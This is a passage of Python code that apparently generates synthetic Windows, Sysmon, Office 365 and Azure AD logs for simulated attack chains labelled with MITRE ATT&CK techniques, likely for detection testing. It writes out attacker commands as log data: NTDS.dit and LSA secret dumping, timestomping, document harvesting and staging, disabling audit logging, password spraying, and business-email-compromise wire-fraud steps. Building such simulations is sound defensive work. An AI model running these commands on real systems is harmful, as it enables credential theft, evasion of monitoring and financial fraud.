        email = user.email if user and user.email else f"{username}@{self.environment.domain}"

        log_data = {
            "office365": {
                "operation": "Get-GlobalAddressList",
                "workload": "Exchange",
                "result_status": "Succeeded",
                "user_id": email,
                "client_ip": "185.220.101.45",
            },
            "agent": {"name": context.agent_name, "id": context.agent_id},
        }

        self._add_log(
            phase="discovery",
            technique="T1087.003",
            host=host.short_name,
            log_data=log_data,
            comment="Global Address List enumeration",
        )

    def _create_org_role_discovery_log(self, host: HostConfig) -> None:
        """Create organizational role discovery log."""
        context = self._get_render_context(host)
        user = self.environment.users[0] if self.environment.users else None
        username = user.username if user else context.username
        email = user.email if user and user.email else f"{username}@{self.environment.domain}"

        log_data = {
            "azure_ad": {
                "activity_display_name": "Get user",
                "category": "UserManagement",
                "result": "success",
                "initiated_by": {
                    "app": {
                        "display_name": "Microsoft Graph Explorer",
                        "app_id": "de8bc8b5-d9f9-48b1-a8ad-b748da725064"
                    }
                },
                "target_resources": [
                    {
                        "user_principal_name": "cfo@" + self.environment.domain,
                        "display_name": "Chief Financial Officer",
                        "type": "User"
                    }
                ],
                "additional_details": [
                    {"key": "Query", "value": "$select=displayName,jobTitle,mail,manager"}
                ]
            },
            "agent": {"name": context.agent_name, "id": context.agent_id},
        }

        self._add_log(
            phase="discovery",
            technique="T1087.003",
            host=host.short_name,
            log_data=log_data,
            comment="Querying organization structure for executives",
        )

    def _create_email_collection_log(self, host: HostConfig) -> None:
        """Create email collection/harvesting log."""
        context = self._get_render_context(host)
        user = self.environment.users[0] if self.environment.users else None
        username = user.username if user else context.username
        email = user.email if user and user.email else f"{username}@{self.environment.domain}"

        log_data = {
            "office365": {
                "operation": "MailItemsAccessed",
                "workload": "Exchange",
                "result_status": "Succeeded",
                "user_id": email,
                "client_ip": "185.220.101.45",
                "affected_items": [
                    {"Subject": "RE: Q4 Wire Transfer Instructions", "InternetMessageId": "<ABC123@mail.company.com>"},
                    {"Subject": "FW: Bank Account Update", "InternetMessageId": "<DEF456@mail.company.com>"},
                    {"Subject": "Urgent: Invoice Payment Required", "InternetMessageId": "<GHI789@mail.company.com>"}
                ],
                "folder_name": "Inbox",
                "operation_count": 47,
            },
            "agent": {"name": context.agent_name, "id": context.agent_id},
        }

        self._add_log(
            phase="collection",
            technique="T1114.002",
            host=host.short_name,
            log_data=log_data,
            comment="Bulk email access - financial communications",
        )

    def _create_attachment_download_log(self, host: HostConfig) -> None:
        """Create email attachment download log."""
        context = self._get_render_context(host)
        user = self.environment.users[0] if self.environment.users else None
        username = user.username if user else context.username
        email = user.email if user and user.email else f"{username}@{self.environment.domain}"

        log_data = {
            "office365": {
                "operation": "FileDownloaded",
                "workload": "Exchange",
                "result_status": "Succeeded",
                "user_id": email,
                "client_ip": "185.220.101.45",
                "source_file_name": "Wire_Transfer_Instructions_Q4.pdf",
                "source_relative_url": "/Attachments",
                "user_agent": "Mozilla/5.0",
            },
            "agent": {"name": context.agent_name, "id": context.agent_id},
        }

        self._add_log(
            phase="collection",
            technique="T1114.002",
            host=host.short_name,
            log_data=log_data,
            comment="Email attachment downloaded - financial document",
        )

    def _create_audit_log_tampering_log(self, host: HostConfig) -> None:
        """Create audit log tampering/disabling log."""
        context = self._get_render_context(host)
        user = self.environment.users[0] if self.environment.users else None
        username = user.username if user else context.username
        email = user.email if user and user.email else f"{username}@{self.environment.domain}"

        log_data = {
            "office365": {
                "operation": "Set-AdminAuditLogConfig",
                "workload": "Exchange",
                "result_status": "Succeeded",
                "user_id": email,
                "client_ip": "185.220.101.45",
                "parameters": [
                    {"Name": "UnifiedAuditLogIngestionEnabled", "Value": "False"}
                ],
            },
            "agent": {"name": context.agent_name, "id": context.agent_id},
        }

        self._add_log(
            phase="defense-evasion",
            technique="T1562.008",
            host=host.short_name,
            log_data=log_data,
            comment="Unified audit logging disabled",
        )

    def _create_read_email_deletion_log(self, host: HostConfig) -> None:
        """Create log for deleting read emails to hide tracks."""
        context = self._get_render_context(host)
        user = self.environment.users[0] if self.environment.users else None
        username = user.username if user else context.username
        email = user.email if user and user.email else f"{username}@{self.environment.domain}"

        log_data = {
            "office365": {
                "operation": "SoftDelete",
                "workload": "Exchange",
                "result_status": "Succeeded",
                "user_id": email,
                "client_ip": "185.220.101.45",
                "affected_items": [
                    {"Subject": "Security Alert: New sign-in detected", "Folder": "Inbox"},
                    {"Subject": "Microsoft account security notification", "Folder": "Inbox"}
                ],
                "destination_folder": "Recoverable Items\\Deletions",
            },
            "agent": {"name": context.agent_name, "id": context.agent_id},
        }

        self._add_log(
            phase="defense-evasion",
            technique="T1070.008",
            host=host.short_name,
            log_data=log_data,
            comment="Security alert emails deleted to hide compromise",
        )

    def _create_impersonation_email_log(self, host: HostConfig) -> None:
        """Create impersonation email send log."""
        context = self._get_render_context(host)
        user = self.environment.users[0] if self.environment.users else None
        username = user.username if user else context.username
        email = user.email if user and user.email else f"{username}@{self.environment.domain}"

        bec_config = self.engagement.bec
        target = bec_config.target_email if bec_config else f"cfo@{self.environment.domain}"

        log_data = {
            "office365": {
                "operation": "Send",
                "workload": "Exchange",
                "result_status": "Succeeded",
                "user_id": email,
                "client_ip": "185.220.101.45",
                "item": {
                    "Subject": "Urgent: Wire Transfer Required Today",
                    "Recipients": [target],
                    "SenderSmtpAddress": email,
                },
                "user_agent": "Microsoft Outlook 16.0",
            },
            "agent": {"name": context.agent_name, "id": context.agent_id},
        }

        self._add_log(
            phase="exfiltration",
            technique="T1534",
            host=host.short_name,
            log_data=log_data,
            comment="Impersonation email sent to financial target",
        )

    def _create_wire_fraud_email_log(self, host: HostConfig) -> None:
        """Create wire fraud email log (BEC final stage)."""
        context = self._get_render_context(host)
        user = self.environment.users[0] if self.environment.users else None
        username = user.username if user else context.username
        email = user.email if user and user.email else f"{username}@{self.environment.domain}"

        bec_config = self.engagement.bec
        target = bec_config.target_email if bec_config else f"accounting@{self.environment.domain}"

        log_data = {
            "office365": {
                "operation": "Send",
                "workload": "Exchange",
                "result_status": "Succeeded",
                "user_id": email,
                "client_ip": "185.220.101.45",
                "item": {
                    "Subject": "RE: Updated Wire Instructions - CONFIDENTIAL",
                    "Recipients": [target],
                    "SenderSmtpAddress": email,
                    "HasAttachments": True,
                },
                "extended_properties": [
                    {"Name": "AttachmentName", "Value": "New_Bank_Account_Details.pdf"},
                    {"Name": "InReplyTo", "Value": "<original-thread-id@company.com>"}
                ],
            },
            "agent": {"name": context.agent_name, "id": context.agent_id},
        }

        self._add_log(
            phase="exfiltration",
            technique="T1534",
            host=host.short_name,
            log_data=log_data,
            comment="Wire fraud email with fake bank details attached",
        )

    # ============================================================
    # Additional Attack Logs - Discovery
    # ============================================================

    def _create_process_discovery_log(self, host: HostConfig) -> None:
        """Create process discovery log (T1057)."""
        parent_guid = self.guid_registry.get_current_process(host.short_name)
        context = self._get_render_context(host, parent_guid=parent_guid)

        commands = [
            ("tasklist /v", "Verbose process listing"),
            ("wmic process list brief", "WMI process enumeration"),
            ("Get-Process | Select-Object Name,Id,Path", "PowerShell process discovery"),
        ]

        for cmd, desc in commands:
            if cmd.startswith("Get-"):
                image = "C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe"
                cmdline = f'powershell.exe -c "{cmd}"'
            elif cmd.startswith("wmic"):
                image = "C:\\Windows\\System32\\wbem\\WMIC.exe"
                cmdline = cmd
            else:
                image = "C:\\Windows\\System32\\tasklist.exe"
                cmdline = cmd

            sysmon_log = {
                "winlog": {
                    "channel": "Microsoft-Windows-Sysmon/Operational",
                    "event_id": 1,
                    "provider_name": "Microsoft-Windows-Sysmon",
                    "computer_name": context.hostname,
                    "event_data": {
                        "UtcTime": context.timestamp.strftime("%Y-%m-%d %H:%M:%S.%f")[:-3],
                        "ProcessGuid": context.guid,
                        "ProcessId": str(context.pid),
                        "Image": image,
                        "CommandLine": cmdline,
                        "CurrentDirectory": f"C:\\Users\\{context.username}\\",
                        "User": f"{context.user_domain}\\{context.username}",
                        "IntegrityLevel": "High",
                        "ParentProcessGuid": parent_guid,
                        "ParentImage": "C:\\Windows\\System32\\cmd.exe",
                    },
                },
                "agent": {"name": context.agent_name, "id": context.agent_id},
            }

            self._add_log(
                phase="discovery",
                technique="T1057",
                host=host.short_name,
                log_data=sysmon_log,
                comment=desc,
            )
            self.timestamp_gen.next()

    def _create_network_connections_discovery_log(self, host: HostConfig) -> None:
        """Create system network connections discovery log (T1049)."""
        parent_guid = self.guid_registry.get_current_process(host.short_name)
        context = self._get_render_context(host, parent_guid=parent_guid)

        commands = [
            ("netstat -ano", "C:\\Windows\\System32\\NETSTAT.EXE"),
            ("netstat -b", "C:\\Windows\\System32\\NETSTAT.EXE"),
            ("Get-NetTCPConnection | Select-Object LocalAddress,LocalPort,RemoteAddress,RemotePort,State,OwningProcess", "C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe"),
        ]

        for cmd, image in commands:
            cmdline = cmd if not cmd.startswith("Get-") else f'powershell.exe -c "{cmd}"'

            sysmon_log = {
                "winlog": {
                    "channel": "Microsoft-Windows-Sysmon/Operational",
                    "event_id": 1,
                    "provider_name": "Microsoft-Windows-Sysmon",
                    "computer_name": context.hostname,
                    "event_data": {
                        "UtcTime": context.timestamp.strftime("%Y-%m-%d %H:%M:%S.%f")[:-3],
                        "ProcessGuid": context.guid,
                        "ProcessId": str(context.pid),
                        "Image": image,
                        "CommandLine": cmdline,
                        "CurrentDirectory": f"C:\\Users\\{context.username}\\",
                        "User": f"{context.user_domain}\\{context.username}",
                        "IntegrityLevel": "High",
                        "ParentProcessGuid": parent_guid,
                        "ParentImage": "C:\\Windows\\System32\\cmd.exe",
                    },
                },
                "agent": {"name": context.agent_name, "id": context.agent_id},
            }

            self._add_log(
                phase="discovery",
                technique="T1049",
                host=host.short_name,
                log_data=sysmon_log,
                comment=f"Network connections discovery: {cmd.split()[0]}",
            )
            self.timestamp_gen.next()

    def _create_system_time_discovery_log(self, host: HostConfig) -> None:
        """Create system time discovery log (T1124)."""
        parent_guid = self.guid_registry.get_current_process(host.short_name)
        context = self._get_render_context(host, parent_guid=parent_guid)

        sysmon_log = {
            "winlog": {
                "channel": "Microsoft-Windows-Sysmon/Operational",
                "event_id": 1,
                "provider_name": "Microsoft-Windows-Sysmon",
                "computer_name": context.hostname,
                "event_data": {
                    "UtcTime": context.timestamp.strftime("%Y-%m-%d %H:%M:%S.%f")[:-3],
                    "ProcessGuid": context.guid,
                    "ProcessId": str(context.pid),
                    "Image": "C:\\Windows\\System32\\net.exe",
                    "CommandLine": "net time \\\\dc01.company.local",
                    "CurrentDirectory": f"C:\\Users\\{context.username}\\",
                    "User": f"{context.user_domain}\\{context.username}",
                    "IntegrityLevel": "Medium",
                    "ParentProcessGuid": parent_guid,
                    "ParentImage": "C:\\Windows\\System32\\cmd.exe",
                },
            },
            "agent": {"name": context.agent_name, "id": context.agent_id},
        }

        self._add_log(
            phase="discovery",
            technique="T1124",
            host=host.short_name,
            log_data=sysmon_log,
            comment="System time discovery via net time",
        )

    def _create_security_software_discovery_log(self, host: HostConfig) -> None:
        """Create security software discovery log (T1518.001)."""
        parent_guid = self.guid_registry.get_current_process(host.short_name)
        context = self._get_render_context(host, parent_guid=parent_guid)

        commands = [
            ('wmic /namespace:\\\\root\\SecurityCenter2 path AntiVirusProduct get displayName', "Query installed AV"),
            ('Get-MpComputerStatus | Select-Object AMServiceEnabled,AntispywareEnabled,AntivirusEnabled,RealTimeProtectionEnabled', "Defender status check"),
            ('reg query "HKLM\\SOFTWARE\\Microsoft\\Windows Defender" /s', "Defender registry query"),
        ]

        for cmd, desc in commands:
            if cmd.startswith("Get-"):
                image = "C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe"
                cmdline = f'powershell.exe -c "{cmd}"'
            elif cmd.startswith("wmic"):
                image = "C:\\Windows\\System32\\wbem\\WMIC.exe"
                cmdline = cmd
            else:
                image = "C:\\Windows\\System32\\reg.exe"
                cmdline = cmd

            sysmon_log = {
                "winlog": {
                    "channel": "Microsoft-Windows-Sysmon/Operational",
                    "event_id": 1,
                    "provider_name": "Microsoft-Windows-Sysmon",
                    "computer_name": context.hostname,
                    "event_data": {
                        "UtcTime": context.timestamp.strftime("%Y-%m-%d %H:%M:%S.%f")[:-3],
                        "ProcessGuid": context.guid,
                        "ProcessId": str(context.pid),
                        "Image": image,
                        "CommandLine": cmdline,
                        "CurrentDirectory": f"C:\\Users\\{context.username}\\",
                        "User": f"{context.user_domain}\\{context.username}",
                        "IntegrityLevel": "High",
                        "ParentProcessGuid": parent_guid,
                        "ParentImage": "C:\\Windows\\System32\\cmd.exe",
                    },
                },
                "agent": {"name": context.agent_name, "id": context.agent_id},
            }

            self._add_log(
                phase="discovery",
                technique="T1518.001",
                host=host.short_name,
                log_data=sysmon_log,
                comment=desc,
            )
            self.timestamp_gen.next()

    # ============================================================
    # Additional Attack Logs - Defense Evasion
    # ============================================================

    def _create_file_deletion_log(self, host: HostConfig) -> None:
        """Create indicator removal file deletion log (T1070.004)."""
        parent_guid = self.guid_registry.get_current_process(host.short_name)
        context = self._get_render_context(host, parent_guid=parent_guid)

        files_to_delete = [
            "C:\\Users\\Public\\payload.exe",
            "C:\\Users\\Public\\mimikatz.exe",
            "C:\\Windows\\Temp\\procdump.exe",
            "C:\\Users\\Public\\data.7z",
        ]

        for filepath in files_to_delete:
            # Sysmon Event 23 - File Delete
            sysmon_log = {
                "winlog": {
                    "channel": "Microsoft-Windows-Sysmon/Operational",
                    "event_id": 23,
                    "provider_name": "Microsoft-Windows-Sysmon",
                    "computer_name": context.hostname,
                    "event_data": {
                        "UtcTime": context.timestamp.strftime("%Y-%m-%d %H:%M:%S.%f")[:-3],
                        "ProcessGuid": context.guid,
                        "ProcessId": str(context.pid),
                        "User": f"{context.user_domain}\\{context.username}",
                        "Image": "C:\\Windows\\System32\\cmd.exe",
                        "TargetFilename": filepath,
                        "Hashes": "SHA256=DELETED",
                        "IsExecutable": "true" if filepath.endswith(".exe") else "false",
                    },
                },
                "agent": {"name": context.agent_name, "id": context.agent_id},
            }

            self._add_log(
                phase="defense-evasion",
                technique="T1070.004",
                host=host.short_name,
                log_data=sysmon_log,
                comment=f"Indicator removal - deleted {filepath.split(chr(92))[-1]}",
            )
            self.timestamp_gen.next()

    def _create_timestomp_log(self, host: HostConfig) -> None:
        """Create timestomping log (T1070.006)."""
        parent_guid = self.guid_registry.get_current_process(host.short_name)
        context = self._get_render_context(host, parent_guid=parent_guid)

        # PowerShell timestomping
        sysmon_log = {
            "winlog": {
                "channel": "Microsoft-Windows-Sysmon/Operational",
                "event_id": 1,
                "provider_name": "Microsoft-Windows-Sysmon",
                "computer_name": context.hostname,
                "event_data": {
                    "UtcTime": context.timestamp.strftime("%Y-%m-%d %H:%M:%S.%f")[:-3],
                    "ProcessGuid": context.guid,
                    "ProcessId": str(context.pid),
                    "Image": "C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe",
                    "CommandLine": 'powershell.exe -c "(Get-Item C:\\Users\\Public\\update.exe).CreationTime = \'01/01/2020 12:00:00\'"',
                    "CurrentDirectory": "C:\\Users\\Public\\",
                    "User": f"{context.user_domain}\\{context.username}",
                    "IntegrityLevel": "High",
                    "ParentProcessGuid": parent_guid,
                    "ParentImage": "C:\\Windows\\System32\\cmd.exe",
                },
            },
            "agent": {"name": context.agent_name, "id": context.agent_id},
        }

        self._add_log(
            phase="defense-evasion",
            technique="T1070.006",
            host=host.short_name,
            log_data=sysmon_log,
            comment="Timestomping - modified file creation time",
        )

    def _create_hidden_files_log(self, host: HostConfig) -> None:
        """Create hidden files and directories log (T1564.001)."""
        parent_guid = self.guid_registry.get_current_process(host.short_name)
        context = self._get_render_context(host, parent_guid=parent_guid)

        sysmon_log = {
            "winlog": {
                "channel": "Microsoft-Windows-Sysmon/Operational",
                "event_id": 1,
                "provider_name": "Microsoft-Windows-Sysmon",
                "computer_name": context.hostname,
                "event_data": {
                    "UtcTime": context.timestamp.strftime("%Y-%m-%d %H:%M:%S.%f")[:-3],
                    "ProcessGuid": context.guid,
                    "ProcessId": str(context.pid),
                    "Image": "C:\\Windows\\System32\\attrib.exe",
                    "CommandLine": "attrib +h +s C:\\Users\\Public\\staging",
                    "CurrentDirectory": "C:\\Users\\Public\\",
                    "User": f"{context.user_domain}\\{context.username}",
                    "IntegrityLevel": "High",
                    "ParentProcessGuid": parent_guid,
                    "ParentImage": "C:\\Windows\\System32\\cmd.exe",
                },
            },
            "agent": {"name": context.agent_name, "id": context.agent_id},
        }

        self._add_log(
            phase="defense-evasion",
            technique="T1564.001",
            host=host.short_name,
            log_data=sysmon_log,
            comment="Hidden staging directory created",
        )

    # ============================================================
    # Additional Attack Logs - Collection
    # ============================================================

    def _create_clipboard_data_log(self, host: HostConfig) -> None:
        """Create clipboard data collection log (T1115)."""
        parent_guid = self.guid_registry.get_current_process(host.short_name)
        context = self._get_render_context(host, parent_guid=parent_guid)

        sysmon_log = {
            "winlog": {
                "channel": "Microsoft-Windows-Sysmon/Operational",
                "event_id": 1,
                "provider_name": "Microsoft-Windows-Sysmon",
                "computer_name": context.hostname,
                "event_data": {
                    "UtcTime": context.timestamp.strftime("%Y-%m-%d %H:%M:%S.%f")[:-3],
                    "ProcessGuid": context.guid,
                    "ProcessId": str(context.pid),
                    "Image": "C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe",
                    "CommandLine": "powershell.exe -c \"Get-Clipboard | Out-File C:\\Users\\Public\\clip.txt\"",
                    "CurrentDirectory": "C:\\Users\\Public\\",
                    "User": f"{context.user_domain}\\{context.username}",
                    "IntegrityLevel": "Medium",
                    "ParentProcessGuid": parent_guid,
                    "ParentImage": "C:\\Windows\\System32\\cmd.exe",
                },
            },
            "agent": {"name": context.agent_name, "id": context.agent_id},
        }

        self._add_log(
            phase="collection",
            technique="T1115",
            host=host.short_name,
            log_data=sysmon_log,
            comment="Clipboard data collection",
        )

    def _create_local_data_staging_log(self, host: HostConfig) -> None:
        """Create local data staging log (T1074.001)."""
        parent_guid = self.guid_registry.get_current_process(host.short_name)
        context = self._get_render_context(host, parent_guid=parent_guid)

        # Create staging directory
        mkdir_log = {
            "winlog": {
                "channel": "Microsoft-Windows-Sysmon/Operational",
                "event_id": 1,
                "provider_name": "Microsoft-Windows-Sysmon",
                "computer_name": context.hostname,
                "event_data": {
                    "UtcTime": context.timestamp.strftime("%Y-%m-%d %H:%M:%S.%f")[:-3],
                    "ProcessGuid": context.guid,
                    "ProcessId": str(context.pid),
                    "Image": "C:\\Windows\\System32\\cmd.exe",
                    "CommandLine": "cmd.exe /c mkdir C:\\Users\\Public\\staging",
                    "CurrentDirectory": "C:\\Users\\Public\\",
                    "User": f"{context.user_domain}\\{context.username}",
                    "IntegrityLevel": "High",
                    "ParentProcessGuid": parent_guid,
                    "ParentImage": "C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe",
                },
            },
            "agent": {"name": context.agent_name, "id": context.agent_id},
        }

        self._add_log(
            phase="collection",
            technique="T1074.001",
            host=host.short_name,
            log_data=mkdir_log,
            comment="Local staging directory created",
        )

        # Copy files to staging
        self.timestamp_gen.next()
        copy_context = self._get_render_context(host, parent_guid=context.guid)
        copy_log = {
            "winlog": {
                "channel": "Microsoft-Windows-Sysmon/Operational",
                "event_id": 1,
                "provider_name": "Microsoft-Windows-Sysmon",
                "computer_name": copy_context.hostname,
                "event_data": {
                    "UtcTime": copy_context.timestamp.strftime("%Y-%m-%d %H:%M:%S.%f")[:-3],
                    "ProcessGuid": copy_context.guid,
                    "ProcessId": str(copy_context.pid),
                    "Image": "C:\\Windows\\System32\\xcopy.exe",
                    "CommandLine": f"xcopy C:\\Users\\{context.username}\\Documents\\*.docx C:\\Users\\Public\\staging\\ /s /e /h /y",
                    "CurrentDirectory": "C:\\Users\\Public\\",
                    "User": f"{context.user_domain}\\{context.username}",
                    "IntegrityLevel": "High",
                    "ParentProcessGuid": context.guid,
                    "ParentImage": "C:\\Windows\\System32\\cmd.exe",
                },
            },
            "agent": {"name": copy_context.agent_name, "id": copy_context.agent_id},
        }

        self._add_log(
            phase="collection",
            technique="T1074.001",
            host=host.short_name,
            log_data=copy_log,
            comment="Files copied to local staging area",
        )

    def _create_automated_collection_log(self, host: HostConfig) -> None:
        """Create automated collection log (T1119)."""
        parent_guid = self.guid_registry.get_current_process(host.short_name)
        context = self._get_render_context(host, parent_guid=parent_guid)

        # PowerShell script for automated data collection
        sysmon_log = {
            "winlog": {
                "channel": "Microsoft-Windows-Sysmon/Operational",
                "event_id": 1,
                "provider_name": "Microsoft-Windows-Sysmon",
                "computer_name": context.hostname,
                "event_data": {
                    "UtcTime": context.timestamp.strftime("%Y-%m-%d %H:%M:%S.%f")[:-3],
                    "ProcessGuid": context.guid,
                    "ProcessId": str(context.pid),
                    "Image": "C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe",
                    "CommandLine": 'powershell.exe -ep bypass -file C:\\Users\\Public\\collect.ps1',
                    "CurrentDirectory": "C:\\Users\\Public\\",
                    "User": f"{context.user_domain}\\{context.username}",
                    "IntegrityLevel": "High",
                    "ParentProcessGuid": parent_guid,
                    "ParentImage": "C:\\Windows\\System32\\cmd.exe",
                },
            },
            "agent": {"name": context.agent_name, "id": context.agent_id},
        }

        self._add_log(
            phase="collection",
            technique="T1119",
            host=host.short_name,
            log_data=sysmon_log,
            comment="Automated data collection script executed",
        )

        # ScriptBlock log for the collection script
        self.timestamp_gen.next()
        scriptblock_log = {
            "winlog": {
                "channel": "Microsoft-Windows-PowerShell/Operational",
                "event_id": 4104,
                "provider_name": "Microsoft-Windows-PowerShell",
                "computer_name": context.hostname,
                "event_data": {
                    "MessageNumber": "1",
                    "MessageTotal": "1",
                    "ScriptBlockText": """$extensions = @('.doc','.docx','.xls','.xlsx','.pdf','.pst')
$targetDirs = @('C:\\Users','C:\\Shares')
foreach ($dir in $targetDirs) {
    Get-ChildItem -Path $dir -Recurse -Include ($extensions | ForEach-Object {"*$_"}) -ErrorAction SilentlyContinue |
    Copy-Item -Destination C:\\Users\\Public\\staging -Force
}""",
                    "ScriptBlockId": context.guid,
                    "Path": "C:\\Users\\Public\\collect.ps1",
                },
            },
            "agent": {"name": context.agent_name, "id": context.agent_id},
        }

        self._add_log(
            phase="collection",
            technique="T1119",
            host=host.short_name,
            log_data=scriptblock_log,
            comment="Automated collection script content",
        )

    # ============================================================
    # Additional Attack Logs - Credential Access
    # ============================================================

    def _create_credential_dumping_ntds_log(self, host: HostConfig) -> None:
        """Create NTDS.dit credential dumping log (T1003.003)."""
        parent_guid = self.guid_registry.get_current_process(host.short_name)
        context = self._get_render_context(host, parent_guid=parent_guid)

        # ntdsutil shadow copy method
        sysmon_log = {
            "winlog": {
                "channel": "Microsoft-Windows-Sysmon/Operational",
                "event_id": 1,
                "provider_name": "Microsoft-Windows-Sysmon",
                "computer_name": context.hostname,
                "event_data": {
                    "UtcTime": context.timestamp.strftime("%Y-%m-%d %H:%M:%S.%f")[:-3],
                    "ProcessGuid": context.guid,
                    "ProcessId": str(context.pid),
                    "Image": "C:\\Windows\\System32\\ntdsutil.exe",
                    "CommandLine": 'ntdsutil "ac i ntds" "ifm" "create full C:\\temp\\ntds" q q',
                    "CurrentDirectory": "C:\\Windows\\System32\\",
                    "User": "NT AUTHORITY\\SYSTEM",
                    "IntegrityLevel": "System",
                    "ParentProcessGuid": parent_guid,
                    "ParentImage": "C:\\Windows\\System32\\cmd.exe",
                },
            },
            "agent": {"name": context.agent_name, "id": context.agent_id},
        }

        self._add_log(
            phase="credential-access",
            technique="T1003.003",
            host=host.short_name,
            log_data=sysmon_log,
            comment="NTDS.dit extraction via ntdsutil",
        )

    def _create_lsa_secrets_dump_log(self, host: HostConfig) -> None:
        """Create LSA secrets dump log (T1003.004)."""
        parent_guid = self.guid_registry.get_current_process(host.short_name)
        context = self._get_render_context(host, parent_guid=parent_guid)

        # Registry-based LSA secrets access
        sysmon_log = {
            "winlog": {
                "channel": "Microsoft-Windows-Sysmon/Operational",
                "event_id": 1,
                "provider_name": "Microsoft-Windows-Sysmon",
                "computer_name": context.hostname,
                "event_data": {
                    "UtcTime": context.timestamp.strftime("%Y-%m-%d %H:%M:%S.%f")[:-3],
                    "ProcessGuid": context.guid,
                    "ProcessId": str(context.pid),
                    "Image": "C:\\Windows\\System32\\reg.exe",
                    "CommandLine": "reg save HKLM\\SECURITY C:\\temp\\security.hiv",
                    "CurrentDirectory": "C:\\Windows\\System32\\",
                    "User": "NT AUTHORITY\\SYSTEM",
                    "IntegrityLevel": "System",
                    "ParentProcessGuid": parent_guid,
                    "ParentImage": "C:\\Windows\\System32\\cmd.exe",
                },
            },
            "agent": {"name": context.agent_name, "id": context.agent_id},
        }

        self._add_log(
            phase="credential-access",
            technique="T1003.004",
            host=host.short_name,
            log_data=sysmon_log,
            comment="LSA secrets extraction via registry export",
        )

    def _create_password_spraying_log(self, host: HostConfig) -> None:
        """Create password spraying attack log (T1110.003)."""
        context = self._get_render_context(host)

        # Multiple failed logons followed by success (spray pattern)
        usernames = ["admin", "administrator", "jsmith", "mwilson", "service.acct"]

        for username in usernames[:3]:  # Show failures first
            fail_log = {
                "winlog": {
                    "channel": "Security",
                    "event_id": 4625,
                    "provider_name": "Microsoft-Windows-Security-Auditing",
                    "computer_name": context.hostname,
                    "event_data": {
                        "SubjectUserSid": "S-1-0-0",
                        "SubjectUserName": "-",
                        "SubjectDomainName": "-",
                        "SubjectLogonId": "0x0",
                        "TargetUserSid": "S-1-0-0",
                        "TargetUserName": username,
                        "TargetDomainName": context.user_domain,
                        "Status": "0xc000006d",
                        "FailureReason": "%%2313",
                        "SubStatus": "0xc000006a",
                        "LogonType": "3",
                        "LogonProcessName": "NtLmSsp",
                        "AuthenticationPackageName": "NTLM",
                        "WorkstationName": "ATTACKER-PC",
                        "IpAddress": "185.220.101.45",
                        "IpPort": str(random.randint(40000, 60000)),
                    },
                },
                "agent": {"name": context.agent_name, "id": context.agent_id},
            }

            self._add_log(
                phase="credential-access",
                technique="T1110.003",
                host=host.short_name,
                log_data=fail_log,
                comment=f"Password spray - failed logon for {username}",
            )
            self.timestamp_gen.next()

    # ============================================================
    # Additional Attack Logs - Exfiltration
    # ============================================================

    def _create_exfil_over_web_service_log(self, host: HostConfig) -> None:
        """Create exfiltration over web service log (T1567)."""
        parent_guid = self.guid_registry.get_current_process(host.short_name)
        context = self._get_render_context(host, parent_guid=parent_guid)

        cloud_services = [
            ("pastebin.com", "443"),
            ("transfer.sh", "443"),
            ("file.io", "443"),
            ("mega.nz", "443"),
        ]

        service, port = random.choice(cloud_services)

        # Network connection to cloud storage
        sysmon_log = {
            "winlog": {
                "channel": "Microsoft-Windows-Sysmon/Operational",
                "event_id": 3,
                "provider_name": "Microsoft-Windows-Sysmon",
                "computer_name": context.hostname,
                "event_data": {
                    "UtcTime": context.timestamp.strftime("%Y-%m-%d %H:%M:%S.%f")[:-3],
                    "ProcessGuid": context.guid,
                    "ProcessId": str(context.pid),
                    "Image": "C:\\Windows\\System32\\curl.exe",
                    "User": f"{context.user_domain}\\{context.username}",
                    "Protocol": "tcp",
                    "Initiated": "true",
                    "SourceIsIpv6": "false",
                    "SourceIp": host.ip,
                    "SourceHostname": context.hostname,
                    "SourcePort": str(random.randint(49152, 65535)),
                    "DestinationIsIpv6": "false",
                    "DestinationIp": "198.51.100.1",
                    "DestinationHostname": service,
                    "DestinationPort": port,
                },
            },
            "agent": {"name": context.agent_name, "id": context.agent_id},
        }

        self._add_log(
            phase="exfiltration",
            technique="T1567",
            host=host.short_name,
            log_data=sysmon_log,
            comment=f"Exfiltration to {service}",
        )

    def _create_data_transfer_size_limits_log(self, host: HostConfig) -> None:
        """Create data transfer size limits log (T1030)."""
        parent_guid = self.guid_registry.get_current_process(host.short_name)
        context = self._get_render_context(host, parent_guid=parent_guid)

        # Split archive to avoid detection
        sysmon_log = {
            "winlog": {
                "channel": "Microsoft-Windows-Sysmon/Operational",
                "event_id": 1,
                "provider_name": "Microsoft-Windows-Sysmon",
                "computer_name": context.hostname,
                "event_data": {
                    "UtcTime": context.timestamp.strftime("%Y-%m-%d %H:%M:%S.%f")[:-3],
                    "ProcessGuid": context.guid,
                    "ProcessId": str(context.pid),
                    "Image": "C:\\Program Files\\7-Zip\\7z.exe",
                    "CommandLine": '7z.exe a -v5m -p"secret" C:\\Users\\Public\\data.7z.001 C:\\Users\\Public\\staging\\*',
                    "CurrentDirectory": "C:\\Users\\Public\\",
                    "User": f"{context.user_domain}\\{context.username}",
                    "IntegrityLevel": "High",
                    "ParentProcessGuid": parent_guid,
                    "ParentImage": "C:\\Windows\\System32\\cmd.exe",
                },
            },
            "agent": {"name": context.agent_name, "id": context.agent_id},
        }

        self._add_log(
            phase="exfiltration",
            technique="T1030",
            host=host.short_name,
            log_data=sysmon_log,
            comment="Data split into 5MB chunks to avoid detection",
        )
